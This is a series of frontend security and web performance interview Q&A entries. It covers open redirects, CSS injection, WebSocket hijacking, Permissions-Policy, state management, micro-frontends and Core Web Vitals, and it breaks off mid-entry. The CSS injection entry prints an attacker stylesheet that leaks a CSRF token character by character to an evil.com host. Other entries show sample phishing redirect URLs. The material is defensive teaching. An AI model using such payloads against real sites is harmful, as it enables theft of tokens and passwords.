SRI prevents third-party CDN supply chain compromises from turning into client-side credential skimming attacks.

## Worked Case

Walkthrough scenario: A British Airways payment page had its third-party script hijacked by Magecart attackers, stealing 380,000 credit cards. If Subresource Integrity had been deployed with integrity="sha384-...", the moment the attackers modified the CDN script to add the credit card skimmer, the file's SHA-384 hash would fail to match the HTML tag, and the browser would refuse to execute the compromised code.

## Risk

Omitting crossorigin='anonymous' causes the browser to ignore the integrity attribute on cross-origin scripts.

## Trade-off

Updating an external library version requires recalculating and deploying the new integrity hash in your HTML.

## Try This

Alter one character in an integrity hash on a CDN script tag and observe the browser console error: Integrity check failed.

## Follow-ups

### What happens if a script with an integrity attribute is served over plain HTTP or fails CORS checks?

The browser refuses to calculate the hash for cross-origin resources without CORS approval, blocking the script completely.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
- https://owasp.org/www-community/attacks/Magecart

# How does Open Redirect vulnerability occur on login callback screens, and how do you validate redirection targets?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** An **Open Redirect** vulnerability occurs when an application accepts an unvalidated user-supplied URL parameter (e.g. `?redirect_to=https://evil.com`) and navigates the browser to that destination (via `window.location.href = redirectTo` or HTTP 302). Attackers exploit this in phishing campaigns: they send victims a link that looks legitimate (`https://trusted-bank.com/login?redirect_to=https://fake-bank.com`). The victim trusts the `trusted-bank.com` domain, logs in, and is immediately redirected to the attacker's fake portal.

Secure validation requires restricting redirects strictly to **relative paths on the same origin** or an explicit domain whitelist:

```typescript
// Secure Redirection Validator:
export function getSafeRedirectUrl(targetUrl: string | null, fallback: string = '/dashboard'): string {
    if (!targetUrl) return fallback;

    // RULE 1: Disallow protocol-relative URLs (e.g. '//evil.com' navigates to evil.com!)
    if (targetUrl.startsWith('//')) return fallback;

    // RULE 2: Safe relative path starting with single slash
    if (targetUrl.startsWith('/') && !targetUrl.startsWith('/\\')) {
        return targetUrl;
    }

    // RULE 3: Strict Origin Whitelisting for Absolute URLs
    try {
        const parsed = new URL(targetUrl, window.location.origin);
        if (parsed.origin === window.location.origin) {
            return parsed.pathname + parsed.search + parsed.hash;
        }
    } catch {
        return fallback;
    }

    return fallback;
}
```

**Complexity analysis and mechanics:**
- **Protocol-relative bypass:** Attackers frequently bypass naive `url.startsWith('/')` checks using `//evil.com`, which the browser parses as a scheme-relative link navigating to `https://evil.com`.
- **Backslash bypass:** In older engines, `/\evil.com` was normalized to `//evil.com`.

**Algorithmic mechanics and edge cases:**
Never perform regex checks like `targetUrl.includes('mycompany.com')`; an attacker easily bypasses this with `https://evilmycompany.com` or `https://attacker.com?ref=mycompany.com`. Always parse with `new URL()` and verify `parsed.origin`.

## Why

Strict relative path validation stops attackers from leveraging trusted brand domains as springboards for phishing campaigns.

## Worked Case

Walkthrough scenario: A company's login page reads const redirect = new URLSearchParams(location.search).get('return'); and calls window.location.href = redirect. An attacker sends a phishing email with a link to company.com/login?return=https://stealer.com. The user enters their password on company.com and gets redirected to stealer.com. Using getSafeRedirectUrl() detects that stealer.com is not on company.com's origin and redirects safely to /dashboard.

## Risk

Naive startsWith('/') checks fail to block protocol-relative URLs (//evil.com), permitting external redirects.

## Trade-off

Disallows arbitrary external redirects unless explicit cross-domain partner origins are allowlisted.

## Try This

Test getSafeRedirectUrl('//attacker.com') vs getSafeRedirectUrl('/profile') and verify it defaults to fallback on protocol-relative URLs.

## Follow-ups

### Why is redirecting to a protocol-relative URL like '//evil.com' dangerous?

Browsers interpret '//evil.com' as inheriting the current page's protocol (https://), navigating directly to the external evil.com website.

## Citations

- https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- https://cwe.mitre.org/data/definitions/601.html

# How do modern browsers protect against CSS injection and font-probing side-channel attacks?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **CSS Injection** is an attack where an attacker injects malicious CSS rules (via an unsanitized `<style>` tag, `style` attribute, or user-controlled CSS theme). Attackers exploit CSS attribute selectors and external `url()` background calls to extract sensitive data (like CSRF tokens or user inputs) character-by-character via **CSS-based Exfiltration**:

```css
/* ATTACKER CSS PAYLOAD: Exfiltrating input value character by character */
input[name="csrf"][value^="a"] { background: url('https://evil.com/leak?char=a'); }
input[name="csrf"][value^="b"] { background: url('https://evil.com/leak?char=b'); }
/* Once 'a' is confirmed: */
input[name="csrf"][value^="ab"] { background: url('https://evil.com/leak?char=ab'); }
```

**Modern Defenses & Browser Mitigations:**
1. **Content Security Policy (`style-src`):** Prohibit inline styles by omitting `'unsafe-inline'` and enforcing nonces (`style-src 'nonce-{RANDOM}'`) or disabling external style loading (`style-src 'self'`).
2. **Restrict `connect-src` and `img-src`:** A strict CSP `img-src 'self'` prevents injected CSS `url(...)` declarations from making unauthorized HTTP background requests to attacker servers.
3. **Browser Sanitization of Custom Fonts:** Browsers restrict CSS font-probing side-channels by partitioning font caches and disabling `url()` triggers on untrusted CSS inputs.

**Complexity analysis and mechanics:**
- **Blind CSS exfiltration:** An attacker needs only ~36 HTTP requests per character (alphanumeric) to exfiltrate an entire 32-character secret token.
- **Safe user themes:** If users are allowed to customize UI colors, accept only validated hex strings (`/^#[0-9a-f]{6}$/i`) applied to CSS variables, never raw user CSS strings.

**Algorithmic mechanics and edge cases:**
Never allow user-supplied HTML to include `<style>` tags or unvalidated `style="..."` attributes; DOMPurify should always be configured to strip style tags (`FORBID_TAGS: ['style']`).

## Why

Restricting style-src and img-src in CSP neutralizes CSS attribute-selector side-channel token extraction.

## Worked Case

Walkthrough scenario: An application allows users to set a custom profile background via markdown: [test](http://foo.com "style=..."). An attacker crafts an injected style block with 50 attribute selectors targeting input[type='password'][value^='a']. As the user types their password, each keystroke triggers a background image fetch to evil.com, logging the user's password. Enforcing CSP style-src 'self' and DOMPurify style stripping halts the CSS exfiltration attack completely.

## Risk

Allowing user-submitted style tags allows attackers to exfiltrate CSRF tokens and user passwords without executing JavaScript.

## Trade-off

Strict style-src nonces require build tooling to attach nonces to injected CSS-in-JS style tags.

## Try This

Inspect how DOMPurify sanitizes style attributes by default to strip expression() and external url() declarations.

## Follow-ups

### Can CSS exfiltration steal data from input fields if the user has not typed into them yet?

It can steal default values populated in the value attribute by the server, but modern browsers prevent CSS attribute selectors from matching dynamic typed values.

## Citations

- https://portswigger.net/research/css-injection-primitives
- https://owasp.org/www-community/attacks/CSS_Injection

# How do you protect client-side WebSocket connections against Cross-Site WebSocket Hijacking (CSWSH)?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **Cross-Site WebSocket Hijacking (CSWSH)** is the WebSocket equivalent of CSRF. When a browser initiates a WebSocket connection (`new WebSocket('wss://api.example.com')`), the browser automatically includes stored session cookies in the HTTP `GET` Upgrade handshake. If an attacker's website (`evil.com`) opens a WebSocket connection to `wss://api.example.com`, the browser transmits the victim's authentication cookies. Because WebSockets are not restricted by the Same-Origin Policy, the attacker's page establishes a full-duplex authenticated socket connection to the user's account.

To defend against CSWSH, frontends and backends implement three defenses:
1. **Server-Side `Origin` Header Validation:** The server must inspect the `Origin` header during the HTTP Upgrade handshake and reject any handshake not originating from an authorized domain.
2. **Short-Lived Ephemeral Ticket Handshake (Frontend Best Practice):** Rather than relying on ambient cookies, the frontend makes an authenticated HTTP `POST /api/ws-token` to obtain a single-use, 30-second ticket, and passes it as a query parameter (`wss://api.com?ticket=xyz123`). The ticket is consumed and invalidated upon connection.
3. **`SameSite=Strict` on Session Cookies:** Prevents the browser from sending session cookies on cross-origin WebSocket upgrades.

```typescript
// Secure Client-Side WebSocket Handshake using Ephemeral Tickets:
export async function connectSecureWebSocket() {
    // 1. Fetch single-use connection ticket over authenticated HTTP:
    const res = await fetch('/api/auth/ws-ticket', { method: 'POST' });
    if (!res.ok) throw new Error('Could not obtain WebSocket ticket');
    const { ticket } = await res.json();

    // 2. Connect using single-use ticket in query string:
    const ws = new WebSocket(`wss://api.enterprise.com/stream?ticket=${encodeURIComponent(ticket)}`);
    ws.onopen = () => console.log('Secure authenticated WebSocket connected');
    return ws;
}
```

**Complexity analysis and mechanics:**
- **Same-Origin Policy exception:** The SOP restricts `fetch` and `XMLHttpRequest`, but explicitly does *not* block opening cross-origin WebSockets.
- **Single-use ticket lifecycle:** The ticket expires in 30 seconds and can only be consumed once, preventing replay attacks.

**Algorithmic mechanics and edge cases:**
The browser's native `WebSocket` API does not allow setting custom HTTP headers during the handshake. Using ticket-based authentication or authenticating immediately via an initial JSON message frame (`{ type: 'AUTH', token }`) over the established socket avoids relying on ambient cookies.

## Why

Ephemeral connection tickets and Origin validation prevent third-party malicious sites from hijacking authenticated WebSockets.

## Worked Case

Walkthrough scenario: An attacker hosts a phishing site that executes const ws = new WebSocket('wss://bank.com/live-transactions'). The user's browser sends bank.com's session cookie. Without Origin checks, the socket connects, and the attacker receives real-time banking notifications. With Origin header validation and single-use tickets, bank.com detects Origin: evil.com, rejects the upgrade with HTTP 403 Forbidden, and protects the user's data stream.

## Risk

Relying purely on ambient session cookies for WebSocket authentication permits any malicious website to open a live hijacked socket.

## Trade-off

Requires an initial HTTP roundtrip to mint an ephemeral ticket before opening the WebSocket connection.

## Try This

Attempt to open a WebSocket connection from a third-party origin in the browser console and verify if the server rejects the handshake.

## Follow-ups

### Can client-side JavaScript forge the Origin header during a WebSocket connection?

No, the Origin header is a forbidden header name managed exclusively by the browser engine; JavaScript cannot overwrite it.

## Citations

- https://owasp.org/www-community/attacks/Cross-Site_WebSocket_Hijacking
- https://datatracker.ietf.org/doc/html/rfc6455#section-10.2

# How do Permission-Policy headers restrict browser feature access (camera, microphone, geolocation, payment)?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **`Permissions-Policy`** (formerly known as `Feature-Policy`) is an HTTP response header that allows site owners to selectively enable, disable, or restrict the use of sensitive browser hardware and powerful web platform features across the page and all embedded `<iframe>` elements. It enforces the principle of least privilege at the browser platform level: if your web application does not require a microphone, camera, or USB device access, disabling them in `Permissions-Policy` guarantees that even if a third-party analytics script or advertising iframe is compromised, the attacker cannot spy on the user or access sensitive device sensors.

```http
HTTP/1.1 200 OK
Permissions-Policy: 
    camera=(), 
    microphone=(), 
    geolocation=(self), 
    payment=(self "https://checkout.partner.com"), 
    usb=(), 
    display-capture=()
```

**Directive Syntax Breakdown:**
- `feature=()` -> Completely disabled for the entire page and all embedded iframes (empty allowlist).
- `feature=(self)` -> Enabled only for the document's own origin; disabled for all third-party iframes.
- `feature=(self "https://domain.com")` -> Enabled for self and explicitly specified external origins.
- `feature=*` -> Enabled for all origins (strongly discouraged for sensitive features).

**Complexity analysis and mechanics:**
- **Hardware-level denial:** When a feature is disabled via `Permissions-Policy`, calling the corresponding API (e.g., `navigator.geolocation.getCurrentPosition`) immediately triggers a `NotAllowedError` DOMException without prompting the user.
- **Iframe inheritance:** Embedded iframes can never exceed the permissions granted by the parent document's `Permissions-Policy`.

**Algorithmic mechanics and edge cases:**
Permissions-Policy also restricts non-hardware features, such as `document-domain=()`, which prevents legacy scripts from using `document.domain` to bypass the Same-Origin Policy, closing historic SOP relaxation loopholes.

## Why

Permissions-Policy restricts access to sensitive hardware sensors, preventing rogue third-party scripts from recording users.

## Worked Case

Walkthrough scenario: A banking dashboard embeds a third-party marketing survey iframe. The survey script gets compromised by a malicious actor attempting to access user cameras via navigator.mediaDevices.getUserMedia(). Because the banking application served Permissions-Policy: camera=(), microphone=(), the browser immediately rejects the media request with NotAllowedError without even displaying a camera prompt to the user, protecting customer privacy.

## Risk

Leaving camera, microphone, and geolocation unconstrained allows compromised third-party scripts to trigger permission prompts.

## Trade-off

Features disabled in the header cannot be used anywhere on the page without updating the server configuration.

## Try This

Set Permissions-Policy: camera=() on a page and observe navigator.mediaDevices.getUserMedia() immediately reject with NotAllowedError.

## Follow-ups

### What was the previous name of the Permissions-Policy header?

It was previously named Feature-Policy before being standardized with new structured field value syntax as Permissions-Policy.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
- https://w3c.github.io/webappsec-permissions-policy/

# How do you architect a frontend application for scale using layered architecture and separation of concerns?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Enterprise frontend applications fail to scale when business logic, network I/O, and UI presentation are tangled inside monolithic React components. A robust, scalable frontend architecture adopts a **Layered Architecture** with unidirectional dependencies divided into four distinct layers:
1. **Presentation Layer (UI):** Pure, declarative components responsible solely for rendering DOM elements and receiving user interactions. Components are agnostic of HTTP endpoints or global stores.
2. **Application Layer (Hooks/Controllers):** Coordinates state, orchestrates business flows, and connects presentation to domain logic (e.g., custom hooks like `useCheckoutFlow()`).
3. **Domain Layer (Entities & Rules):** Framework-agnostic pure TypeScript classes, types, and validation rules (e.g., `calculateCartTax(cart)`). Zero dependencies on React or DOM.
4. **Infrastructure Layer (Data & Network):** Implements HTTP clients, WebSocket connections, IndexedDB, and analytics adapters.

```typescript
// 1. DOMAIN LAYER (Pure TypeScript, Zero Framework Dependencies)
export interface CartItem { id: string; price: number; quantity: number; }
export function calculateCartTotal(items: CartItem[]): number {
    return items.reduce((sum, item) => sum + item.price * item.quantity, 0);
}

// 2. INFRASTRUCTURE LAYER (Network Client)
export const cartApi = {
    checkout: async (items: CartItem[]) => apiFetch('/api/checkout', { method: 'POST', body: items })
};

// 3. APPLICATION LAYER (React Hook Orchestration)
export function useCheckout() {
    const [items, setItems] = useState<CartItem[]>([]);
    const total = useMemo(() => calculateCartTotal(items), [items]);
    const checkout = async () => cartApi.checkout(items);
    return { items, total, checkout };
}

// 4. PRESENTATION LAYER (Pure Component View)
export function CartView({ total, onCheckout }: { total: number; onCheckout: () => void }) {
    return (
        <div>
            <p>Total: ${total}</p>
            <button onClick={onCheckout}>Checkout</button>
        </div>
    );
}
```

**Complexity analysis and mechanics:**
- **Testability:** Domain logic is unit-tested without React testing libraries or DOM mocks in milliseconds.
- **Framework portability:** If the UI migrates from React to Vue or React Native, the entire Domain and Infrastructure layers are reused with zero modifications.

**Algorithmic mechanics and edge cases:**
Enforce dependency boundaries using ESLint rules (like `eslint-plugin-import` or `nx` boundaries) to prevent Presentation components from directly importing Infrastructure network clients.

## Why

Layered architecture isolates business rules from UI frameworks, enabling independent unit testing and long-term maintainability.

## Worked Case

Walkthrough scenario: An enterprise fintech app needs to support both a Web client (React) and a Mobile client (React Native). Because tax calculations, interest rates, and loan validation were written as pure TypeScript domain functions in a shared package, the mobile team reused 100% of the domain calculations, reducing the mobile development timeline from 6 months to 6 weeks.

## Risk

Allowing presentation components to make raw fetch calls directly creates tight coupling that makes UI refactoring impossible.

## Trade-off

Introduces more files and architectural discipline compared to rapid monolithic component prototyping.

## Try This

Write unit tests for a pure domain pricing function without importing React or testing-library and observe sub-millisecond execution.

## Follow-ups

### How do you enforce architectural layer boundaries automatically in CI?

Use ESLint import boundary rules (e.g. eslint-plugin-import or Nx module boundaries) that throw build errors if domain layers import presentation code.

## Citations

- https://martinfowler.com/bliki/PresentationDomainDataLayering.html
- https://khalilstemmler.com/articles/client-side-architecture/introduction/

# How do you evaluate and select state management solutions across local state, Context, Zustand, Redux, and server cache?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** State in modern frontend applications is not uniform; choosing a state management tool requires categorizing state into four distinct categories and selecting the lightest tool that solves the problem:
1. **Local Component State (`useState`, `useReducer`):** Ephemeral UI state confined to a single component (form inputs, toggle state, accordion open/close). Default to this for 80% of state.
2. **Server Cache State (TanStack Query / SWR):** Remote database state that is asynchronous, shared, and requires caching, revalidation, and optimistic updates. Never store server data in Redux or global stores manually.
3. **Global Client State (`Zustand` / `Redux Toolkit`):** Complex synchronous client-side UI state shared across disparate components (active theme, user preferences, audio player playback queue, canvas shape selection).
4. **Low-Frequency Static Context (`React Context`):** Values that change rarely and are needed everywhere (current authenticated user object, locale string).

```typescript
// Modern Lightweight Global Store with Zustand (supports selectors):
import { create } from 'zustand';

interface PlayerStore {
    isPlaying: boolean;
    volume: number;
    togglePlay: () => void;
    setVolume: (v: number) => void;
}

export const usePlayerStore = create<PlayerStore>((set) => ({
    isPlaying: false,
    volume: 80,
    togglePlay: () => set(state => ({ isPlaying: !state.isPlaying })),
    setVolume: (volume) => set({ volume })
}));

// Consumer component using selective re-rendering:
function PlayButton() {
    // Only re-renders when isPlaying changes, ignores volume changes!
    const isPlaying = usePlayerStore(s => s.isPlaying);
    const togglePlay = usePlayerStore(s => s.togglePlay);
    return <button onClick={togglePlay}>{isPlaying ? 'Pause' : 'Play'}</button>;
}
```

**Complexity analysis and mechanics:**
- **Selector performance:** Zustand uses `useSyncExternalStore` with equality checks, ensuring components only re-render when their selected slice changes.
- **Redux comparison:** Redux Toolkit is suited for massive enterprise applications requiring strict time-travel debugging, serialization middleware, and complex saga side-effects.

**Algorithmic mechanics and edge cases:**
The biggest anti-pattern in modern React is using Redux to fetch and store server data manually with `FETCH_START`, `FETCH_SUCCESS`, `FETCH_ERROR` actions. Migrating server state to TanStack Query eliminates 90% of legacy Redux boilerplate.

## Why

Properly partitioning state categories prevents monolithic store bloat and stops cascading re-renders across consumers.

## Worked Case

Walkthrough scenario: An application with 200 components stored all backend data in a Redux store with 15,000 lines of boilerplate. The team migrated server data to TanStack Query. The Redux codebase shrank by 85%, leaving only a 150-line Zustand store for managing the persistent audio player state and sidebar collapse toggle.

## Risk

Duplicating server response data into a global Redux store causes cache desynchronization and stale UI bugs.

## Trade-off

Zustand provides zero-boilerplate selector stores; Redux Toolkit offers structured governance and middleware for huge teams.

## Try This

Replace a complex React Context holding state with a Zustand store and verify that unselected state changes cause zero re-renders.

## Follow-ups

### Why is React Context ill-suited for high-frequency state updates like mouse coordinates or animations?

Context lacks fine-grained selectors; updating a context value forces every component calling useContext() to re-render, creating severe CPU bottlenecks.

## Citations

- https://tanstack.com/query/latest/docs/framework/react/overview
- https://github.com/pmndrs/zustand

# How do Micro-Frontends work using Webpack/Vite Module Federation, and what are the trade-offs vs a monolith?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Micro-Frontends extend microservices principles to the web frontend: decomposing a large monolithic frontend into smaller, semi-independent micro-applications owned by distinct vertical feature teams (e.g., Team Checkout, Team Catalog, Team Search). While early micro-frontends used clunky iframes, modern micro-frontends use **Module Federation** (supported in Webpack 5 and Vite via plugins). Module Federation allows a 'Host' container application to dynamically import remote JavaScript bundles at runtime across different domains, while sharing singleton dependencies (like `react` and `react-dom`) so libraries are downloaded only once.

```javascript
// webpack.config.js for Remote Application (Team Checkout)
new ModuleFederationPlugin({
    name: 'checkoutApp',
    filename: 'remoteEntry.js',
    exposes: {
        './CheckoutWidget': './src/CheckoutWidget.tsx'
    },
    shared: {
        react: { singleton: true, requiredVersion: '^18.0.0' },
        'react-dom': { singleton: true, requiredVersion: '^18.0.0' }
    }
});

// Inside Host Container (Shell Application):
import React, { Suspense, lazy } from 'react';
// Dynamically loads bundle from checkout.enterprise.com at runtime!
const RemoteCheckout = lazy(() => import('checkoutApp/CheckoutWidget'));

function Shell() {
    return (
        <Suspense fallback={<div>Loading checkout...</div>}>
            <RemoteCheckout orderId="123" />
        </Suspense>
    );
}
```

**Complexity analysis and mechanics:**
- **Independent deployment:** Team Checkout can deploy bug fixes to `checkout.enterprise.com/remoteEntry.js` without recompiling or redeploying the Shell.
- **Shared Singleton:** `singleton: true` prevents loading duplicate copies of React in memory, avoiding hook runtime crashes.

**Algorithmic mechanics and edge cases:**
Trade-offs are substantial: Micro-frontends introduce operational complexity, runtime version mismatch risks, CSS style pollution (requiring CSS modules or Shadow DOM), and slower initial page loads. Only adopt micro-frontends when organizational scale (>50 developers across distinct teams) makes monolithic builds a deployment bottleneck.

## Why

Module Federation enables independent CI/CD deployments across large engineering organizations without full app redeploys.

## Worked Case

Walkthrough scenario: An enterprise e-commerce platform has 200 developers. Monolithic builds take 45 minutes, creating a CI bottleneck. Decomposing into Shell, Product, and Checkout micro-frontends via Module Federation allows Team Checkout to build and deploy its remote in 2 minutes. When Checkout pushes a critical payment bug fix, users see the updated widget immediately on the next navigation without a shell release.

## Risk

Incompatible dependency versions between Host and Remote (e.g. React 18 vs 17) can trigger hook dispatcher runtime crashes.

## Trade-off

Grants team deployment autonomy at the expense of significant build configuration complexity and increased runtime debugging difficulty.

## Try This

Configure a Module Federation remote entry and verify the Host dynamically fetches remoteEntry.js in the browser network tab.

## Follow-ups

### What happens if a Host and a Remote declare incompatible versions of React in Module Federation?

If singleton: true is set and versions conflict, the host emits a console warning and picks the highest compatible version, or fails if strictVersion: true is configured.

## Citations

- https://webpack.js.org/concepts/module-federation/
- https://martinfowler.com/articles/micro-frontends.html

# How do you diagnose and optimize Largest Contentful Paint (LCP) in modern web applications?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **Largest Contentful Paint (LCP)** is a Core Web Vital measuring perceived loading speed. It marks the point in the page load timeline when the main content of a page (typically a hero image, video poster, or large text heading block) has likely rendered on screen. A good LCP score is **2.5 seconds or less**.

LCP time breaks down into four sub-parts:
1. **Time to First Byte (TTFB):** Server response latency.
2. **Resource Load Delay:** Time between page start and browser discovering the LCP resource.
3. **Resource Load Duration:** Time taken to download the LCP resource bytes.
4. **Element Render Delay:** Time between resource download completion and visual painting.

```html
<!-- 1. Preload Hero Image to eliminate Resource Load Delay -->
<link rel="preload" fetchpriority="high" as="image" href="/hero.avif" type="image/avif">

<!-- 2. Optimized Hero Image Markup -->
<img
    src="/hero.avif"
    fetchpriority="high"  <!-- Instructs browser to download image immediately -->
    decoding="async"
    width="1200"
    height="600"
    alt="Product Hero"
>
<!-- CRITICAL RULE: NEVER put loading="lazy" on the LCP image! -->
```

**Complexity analysis and mechanics:**
- **`fetchpriority="high"`:** Boosts the network priority of the image above scripts and non-critical stylesheets.
- **Format compression:** Converting PNG/JPEG to modern AVIF or WebP cuts resource load duration by 50–70%.

**Algorithmic mechanics and edge cases:**
The most common engineering mistake is adding `loading="lazy"` to all images via a generic component. Placing `loading="lazy"` on the LCP hero image forces the browser to wait until layout is calculated before starting the download, adding 1–2 seconds of delay to LCP!

## Why

Optimizing LCP directly improves user conversion rates and search engine rankings by delivering visible hero content in under 2.5s.

## Worked Case

Walkthrough scenario: An e-commerce product page has an LCP of 4.8 seconds. DevTools diagnostics reveal the hero image is referenced in a background CSS url() inside a client bundle and marked loading='lazy'. Removing loading='lazy', adding <link rel="preload" fetchpriority="high">, and converting the image to AVIF brings LCP down from 4.8s to 1.8s, entering the 'Good' Core Web Vitals threshold.

## Risk

Applying loading='lazy' to the LCP hero image delays its network request until after layout, severely degrading LCP scores.

## Trade-off

Preloading hero assets consumes early bandwidth that could otherwise download scripts; only preload the single true LCP candidate.

## Try This

Run Lighthouse in Chrome DevTools on a page with and without fetchpriority='high' on the hero image and compare LCP timings.

## Follow-ups

### What is the threshold for a 'Good' Largest Contentful Paint score according to Google?

An LCP of 2.5 seconds or less for at least 75% of page visits measured in the field.

## Citations

- https://web.dev/articles/lcp
- https://web.dev/articles/optimize-lcp

# How does Interaction to Next Paint (INP) measure web responsiveness, and how do you reduce long main-thread tasks?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **Interaction to Next Paint (INP)** replaced First Input Delay (FID) as the official Core Web Vital for measuring page responsiveness. While FID measured only the *first* input delay, INP measures the latency of **all user interactions** (clicks, taps, key presses) throughout the entire page lifecycle and reports the 98th percentile worst latency. A good INP score is **200 milliseconds or less**.

INP latency consists of three phases:
1. **Input Delay:** Waiting for background main-thread tasks to finish before the event handler can even start.
2. **Processing Time:** Time spent executing the JavaScript event handler code.
3. **Presentation Delay:** Time taken by React and the browser to recalculate layout and paint the next visual frame.

```typescript
// 1. Yielding to the Main Thread via scheduler.yield() (modern standard):
async function processLargeBatch(items: string[]) {
    for (let i = 0; i < items.length; i++) {
        heavyCalculation(items[i]);

        // Every 50 items, yield control to allow browser to process clicks/paint:
        if (i % 50 === 0) {
            if ('scheduler' in window && 'yield' in (window as any).scheduler) {
                await (window as any).scheduler.yield();
            } else {
                // Fallback for older browsers:
                await new Promise(resolve => setTimeout(resolve, 0));
            }
        }
    }
}

// 2. Offloading to Web Workers (Zero main-thread blocking):
// worker.postMessage({ items });
```

**Complexity analysis and mechanics:**
- **Long Tasks:** Any task exceeding 50ms is classified as a Long Task by the browser profiler.
- **`scheduler.yield()`:** Unlike `setTimeout(0)` (which puts the task at the end of the entire macrotask queue), `scheduler.yield()` yields to urgent input and paint, and immediately resumes the computation as a continuation task.

**Algorithmic mechanics and edge cases:**
Optimizing INP also requires reducing React re-render scope: avoiding massive re-renders across the whole page when an input field or hover state changes. Use `useTransition` to split urgent visual input updates from non-urgent heavy processing.

## Why

INP reflects real-world user frustration with lagging clicks, dropped keystrokes, and frozen web interfaces.

## Worked Case

Walkthrough scenario: A data table with 10,000 rows sorts rows synchronously on header click, taking 450ms. When users click, the button freezes in a depressed state and the browser stops responding (INP: 450ms). Refactoring the sorting algorithm into a Web Worker off the main thread brings main-thread processing time down to 12ms, achieving an INP of 48ms.

## Risk

Executing synchronous loops over 50ms locks the main thread, queuing clicks and causing severe INP regressions.

## Trade-off

Yielding to the main thread slightly increases overall task completion time in exchange for keeping the UI responsive to user input.

## Try This

Profile a heavy button click handler in Chrome DevTools Performance panel and identify Long Tasks exceeding 50ms.

## Follow-ups

### Why is scheduler.yield() superior to setTimeout(0) for breaking up long tasks?

scheduler.yield() yields to allow input handling and paints, then resumes the task immediately without being demoted behind unrelated macrotasks.

## Citations

- https://web.dev/articles/inp
- https://web.dev/articles/optimize-long-tasks

# What causes Cumulative Layout Shift (CLS), and what engineering practices guarantee visual layout stability?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **Cumulative Layout Shift (CLS)** is the Core Web Vital that measures visual stability. It quantifies unexpected layout shifts where visible page elements move position from one rendered frame to the next without user interaction (e.g., text jumping downward just as a user attempts to tap a button, causing them to click an ad instead). A good CLS score is **0.1 or less**.

Primary causes of CLS and their engineering remedies:
1. **Images & Videos without dimensions:** Always specify explicit `width` and `height` attributes or CSS `aspect-ratio` on `<img>` and `<video>` tags so the browser reserves the exact layout space before bytes download.
2. **Dynamic ads, embeds, and iframes:** Reserve slot dimensions using min-height containers before ad scripts inject.
3. **Web Fonts causing FOIT/FOUT:** When custom web fonts load, the text reflows if the fallback system font has different metrics. Use `font-display: optional` or CSS `@font-face` metric overrides (`size-adjust`, `ascent-override`, `descent-override`) to match fallback dimensions.

```html
<!-- 1. Explicit Aspect Ratio on Responsive Images (ZERO CLS) -->
<img
    src="/product.webp"
    width="800"
    height="450"
    style="width: 100%; height: auto; aspect-ratio: 16 / 9;"
    alt="Product preview">

<!-- 2. Reserved Container for Dynamic Banner / Ad -->
<div style="min-height: 250px; background: #f0f0f0;">
    <!-- Dynamic banner injects here without pushing content down -->
    <DynamicBanner />
</div>
```

**Complexity analysis and mechanics:**
- **CLS formula:** $	ext{Layout Shift Score} = 	ext{Impact Fraction} 	imes 	ext{Distance Fraction}$.
- **User exclusion:** Layout shifts that occur within 500ms of a direct user interaction (like clicking an accordion) are excluded from the CLS score.

**Algorithmic mechanics and edge cases:**
Injecting non-sticky banner alerts or cookie consent banners at the top of the DOM after page load causes 100% of the entire page content to shift downward, producing massive CLS penalties. Always render cookie banners with `position: fixed` or `position: sticky`.

## Why

Eliminating CLS prevents accidental clicks, improves user trust, and achieves optimal Google search ranking criteria.

## Worked Case

Walkthrough scenario: A news article displays a 300x250 ad banner between paragraphs without a reserved container. When the ad script loads 1.5 seconds later, the entire article text jumps downward by 250px, producing a poor CLS of 0.35. Adding style="min-height: 250px" to the ad wrapper reserves the exact space on initial paint, dropping CLS to 0.00.

## Risk

Injecting dynamic content above the fold pushes text downward, causing users to misclick destructive buttons.

## Trade-off

Reserving layout space for dynamic ads can leave temporary blank boxes while advertisements load.

## Try This

Inspect the Layout Shifts track in Chrome DevTools Performance panel to pinpoint the exact DOM element triggering shifts.

## Follow-ups

### How does CSS aspect-ratio solve layout shift for responsive images?

aspect-ratio allows the browser to calculate the container's height immediately based on its width, reserving layout space before image bytes download.

## Citations

- https://web.dev/articles/cls
- https://web.dev/articles/optimize-cls

# How does list virtualization (windowing) render thousands of dynamic items smoothly at 60fps?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In web browsers, maintaining thousands of DOM nodes consumes vast amounts of memory, slows style recalculation, and causes severe layout thrashing. **List Virtualization (Windowing)** renders *only the visible items* currently within the viewport (plus a small overscan buffer above and below). As the user scrolls, virtualization libraries (like `react-window` or `@tanstack/react-virtual`) dynamically recycle and swap out off-screen DOM nodes while maintaining an outer container with the correct total scroll height.

```tsx
